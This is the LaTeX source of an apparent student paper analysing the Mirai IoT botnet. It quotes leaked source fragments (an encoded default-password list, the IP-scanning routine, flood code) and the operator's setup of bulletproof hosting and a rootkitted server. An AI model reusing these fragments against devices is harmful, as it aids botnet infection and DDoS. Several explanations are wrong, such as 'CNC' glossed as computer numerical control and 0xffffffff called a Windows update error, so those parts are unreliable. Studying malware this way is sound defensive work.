\documentclass[12pt, letterpaper]{article}
% must use this pkg for displaying imgs
\usepackage{graphicx}
\usepackage{blindtext}
\usepackage{etoolbox}
\usepackage[a4paper, total={6in, 9in}]{geometry}
\graphicspath{ {../../imgs/} }
% pkg for links
\usepackage{hyperref}
% for codeblocks highlighting
\usepackage{listings}

\makeatletter
\patchcmd{\raggedright}{\parindent\z@}{}{}{}
\makeatother

\begin{document}


\newcommand{\paperauthor}{Akiel Aries}
\newcommand{\papersupervisor}{Prof. Sareh Assiri}
\newcommand{\paperuniversity}{Northern Arizona University}

\newcommand{\papertitle}{Analyzing Mirai}
\newcommand{\paperminortitle}{a *Nix-Focused Attack}
\newcommand{\papermajorheading}{Cybersecurity}
\newcommand{\paperminorheading}{CYB 410 - Software Security}

\newcommand{\HRule}{\rule{\linewidth}{0.5mm}} % Defines a new command for the horizontal lines, change thickness here

\center % Center everything on the page

%----------------------------------------------------------------------------------------
%	HEADING SECTIONS
%----------------------------------------------------------------------------------------

\textsc{\LARGE \paperuniversity}\\[1.0cm] % Name of your university/college
\textsc{\Large \papermajorheading}\\[0.2cm] % Major heading such as course name
\textsc{\large \paperminorheading}\\[0.75cm] % Minor heading such as course title

%----------------------------------------------------------------------------------------
%	TITLE SECTION
%----------------------------------------------------------------------------------------

\HRule \\[0.4cm]
{ \huge \bfseries \papertitle}\\[0.05cm] % Title of your document
{ \huge \paperminortitle}\\[0.025cm] % Title of your document
\HRule \\[3.5cm]

\begin{center}
	\makebox[1.0\textwidth]{\includegraphics[width=1.0\textwidth]{mirai-major-events-timeline.png}}
\end{center}


\vfill % Fill the rest of the page with whitespace
%----------------------------------------------------------------------------------------
%	AUTHOR SECTION
%--------------------------------------------------------------------------------------

\begin{minipage}{0.4\textwidth}
	\begin{flushleft} \large
	\emph{Author:}\\
	\paperauthor
	\end{flushleft}
	\end{minipage}
	~
	\begin{minipage}{0.4\textwidth}
	\begin{flushright} \large
	\emph{Professor:} \\
	\papersupervisor
	\end{flushright}
\end{minipage}\\[1cm]

%----------------------------------------------------------------------------------------
%	DATE SECTION
%----------------------------------------------------------------------------------------
{\large \today}\\ % Date, change the \today to a set date if you want to be precise

\newpage

\begin{sloppypar}


% classification img
%\includegraphics[scale=0.3]{mirai-major-events-timeline.png}
\begin{flushleft}
\section{Overview}
Mirai is a piece of malware targeting IoT (Internet of Things) devices first discovered 
in 2016 by a malware research group MalwareMustDie and gaining more popularity when 
cybersecurity journalist Brian Krebs' website was attacked. The goal being to 
control nodes part of a botnet running large-scale attacks. From previous research on 
attack history most victims include consumer grade devices such as local home routers 
and IP cameras, which are known to be insecure and attack-prone. The bot has been used 
in very large-scale DDoS (Distrubuted Denial of Service) atacks targeting many users 
machines and taking place accross the globe. Mirai's networking agent is written in C 
and its controller interface written in Go. It utilizes computer numerical control (CNC) 
which is a quite genius way to control the operation and functionality of a machine 
through injection of software. Since being discover and its source code leaked, Mirai 
went on to spawn many variations, much like pieces of malware, that exploited zero-day's 
in some pieces of software for effecient and malicious operation. In recent news, on
October 14th 2022, it was reported that the Wynncraft Minecraft server was hit with
a 2.5 Tbps DDoS attack lasting about 2 minutes in total. As we go in depth we will see
why this number is absurd. 

\newpage

\section{Code}
The scanner.c file does most of the initializing and calling of source. So within this
file the first thing that caught my attention was the \verb|void scanner_init(void)| 
function. In the function we can see a series of \verb|add_auth_entry| calls that add 
in usernames as well as password to perform a dictionary attack to sign in to insecure
IoT devices. Which seems to be the biggest fix to preventing this piece of malware from
infecting your system, using a somewhat secure password!

\begin{lstlisting}
// Set up passwords
// root     xc3511
add_auth_entry("\x50\x4D\x4D\x56", 
"\x5A\x41\x11\x17\x13\x13", 10);
// root     vizxv
add_auth_entry("\x50\x4D\x4D\x56", 
"\x54\x4B\x58\x5A\x54", 9);
// root     admin
add_auth_entry("\x50\x4D\x4D\x56",
"\x43\x46\x4F\x4B\x4C", 8);
// admin    admin
add_auth_entry("\x43\x46\x4F\x4B\x4C", 
"\x43\x46\x4F\x4B\x4C", 7);
// root     888888
add_auth_entry("\x50\x4D\x4D\x56", 
"\x1A\x1A\x1A\x1A\x1A\x1A", 6);
// root     xmhdipc
add_auth_entry("\x50\x4D\x4D\x56", 
"\x5A\x4F\x4A\x46\x4B\x52\x41", 5);
// root     default
add_auth_entry("\x50\x4D\x4D\x56", 
"\x46\x47\x44\x43\x57\x4E\x56", 5);
\end{lstlisting}

Interesting enough, within the scanner.c file some addresses are hardcoded not to visit 
when performing the IP scan for inital infection. The Department of Defense, the US Postal
Service, GE, HP as well as the Internet Assigned Numbers Authority (IANA) + more were 
deemed as invalid for scanning.

\begin{lstlisting}
static ipv4_t get_random_ip(void) {
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do {
        tmp = rand_next();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while (o1 == 127 || // 127.0.0.0/8      - Loopback
          // 0.0.0.0/8		- Invalid address space
          (o1 == 0) || 
          // 3.0.0.0/8		- General Electric Company
          (o1 == 3) || 
          // 15.0.0.0/7		- Hewlett-Packard Company
          (o1 == 15 || o1 == 16) || 
          // 56.0.0.0/8       - US Postal Service
          (o1 == 56) || 
          // 10.0.0.0/8       - Internal network
          (o1 == 10) || 
          // 192.168.0.0/16   - Internal network
          (o1 == 192 && o2 == 168) ||
          // 172.16.0.0/14    - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||
          // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 100 && o2 >= 64 && o2 < 127) ||
          // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||
          // 198.18.0.0/15    - IANA Special use
          (o1 == 198 && o2 >= 18 && o2 < 20) ||
          // 224.*.*.*+       - Multicast
          (o1 >= 224) ||
		  /*
		   * 6.0.0.0/7                 - Department of Defense 
		   * 11.0.0.0/8                - Department of Defense
		   * 21.0.0.0/8                - Department of Defense
		   * 22.0.0.0/8                - Department of Defense
		   * 26.0.0.0/8                - Department of Defense
		   * 28.0.0.0/7                - Department of Defense
		   * 30.0.0.0/8                - Department of Defense
		   * 33.0.0.0/8                - Department of Defense
		   * 55.0.0.0/8                - Department of Defense
		   * 214.0.0.0/7               - Department of Defense
		  /*          
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 
          || o1 == 22 || o1 == 26 || o1 == 28 
          || o1 == 29 || o1 == 30 || o1 == 33 
          || o1 == 55 || o1 == 214 || o1 == 215) 
          
    );

    return INET_ADDR(o1,o2,o3,o4);
}

\end{lstlisting}
Mirai uses many techniques to hide it's identity and what I found the most
naive method to be was the spoofing of user agents specifically these:
\begin{verbatim}
Mozilla/5.0 (Windows NT 10.0; WOW64) 
AppleWebKit/537.36 (KHTML, like Gecko) 
Chrome/51.0.2704.103 Safari/537.36

Mozilla/5.0 (Windows NT 10.0; WOW64) 
AppleWebKit/537.36 (KHTML, like Gecko) 
Chrome/52.0.2743.116 Safari/537.36

Mozilla/5.0 (Windows NT 6.1; WOW64) 
AppleWebKit/537.36 (KHTML, like Gecko) 
Chrome/51.0.2704.103 Safari/537.36

Mozilla/5.0 (Windows NT 6.1; WOW64) 
AppleWebKit/537.36 (KHTML, like Gecko) 
Chrome/52.0.2743.116 Safari/537.36

Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) 
AppleWebKit/601.7.7 (KHTML, like Gecko) 
Version/9.1.2 Safari/601.7.7
\end{verbatim}


Since Mirai is a DDOS bot, there are many spots in the code base of the bug that 
references some networking principles. The OSI (Open Systems Interconnection) model 
depicting the functions of a networking system. For now, let's take a look at how
Mirai makes use of layer 3, network. 
\begin{center}
{\includegraphics[width=0.5\textwidth]{osi-networking.png}}
\end{center}

Mirai makes use of launching GRE IP (Generic Routing Encapsulation) \& GRE ETH floods
in conjunction with SYN \& ACK floods. Another important piece of the code is the 
hardcoding/bypassing taking place that implies more security risks. The GRE floods
when analyzed closely peak at approximately 280 Gbps.

\begin{center}
{\includegraphics[width=1.0\textwidth]{mirai-bandwidth.png}}
\end{center}

This loop iterates through the ACK + SEQ numbers that are retrieved. SEQ is the value
sent by a TCP client that specifies the amount of data sent in the session. ACK is the 
value returned by the TCP server that indicates data has been recieved and is ready to
begin the next segment. 

\begin{lstlisting}
// Retrieve all ACK/SEQ numbers
for (i = 0; i < targs_len; i++) {
    int fd;
    struct sockaddr_in addr, recv_addr;
    socklen_t recv_addr_len;
    char pktbuf[256];
    time_t start_recv;

    stomp_setup_nums:
\end{lstlisting}

This particular piece of the tcp attack file caught my attention and I found
that 0xffffffff is a Windows update error returning when the update fails to search 
or install. 

\begin{lstlisting}
if (source_ip == 0xffffffff)
	iph->saddr = rand_next();
\end{lstlisting}

\newpage

\section*{Scale}
It was reported that the Mirai virus was located in 160+ countries.
Geolocations of devices infected by Mirai:
\begin{center}
\begin{tabular}{c c}
Vietnam	& 12.8 \%\\
Brazil & 11.8 \%\\
United States & 10.9 \%\\
China & 8.8 \%\\
Mexico & 8.4 \%\\
South Korea	& 6.2 \%\\
Taiwan & 4.9 \%\\
Russia & 4.0 \%\\
Romania	& 2.3 \%\\
Colombia	 & 1.5 \%\\
\end{tabular}
\end{center}



\section*{Execution}

Requirements: \\
\begin{itemize}
\item 2 servers: 1 for CNC + mysql, 1 for scan receiver, and 1+ for loading
\end{itemize}

Setup
\begin{itemize}
\item 2 VPS and 4 servers
\item 1 VPS with extremely bulletproof host for database server
\item 1 VPS, rootkitted, for scanReceiver and distributor
\item 1 server for CNC (used like 2% CPU with 400k bots)
\item 3x 10gbps NForce servers for loading (distributor distributes to 3 servers equally)
\end{itemize}



\section*{Static Analysis/Debugging}


\section*{Final Notes}


\section*{Sources}
https://www.imperva.com/blog/malware-analysis-mirai-ddos-botnet/
https://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html

\end{flushleft}
\end{sloppypar}
\end{document}
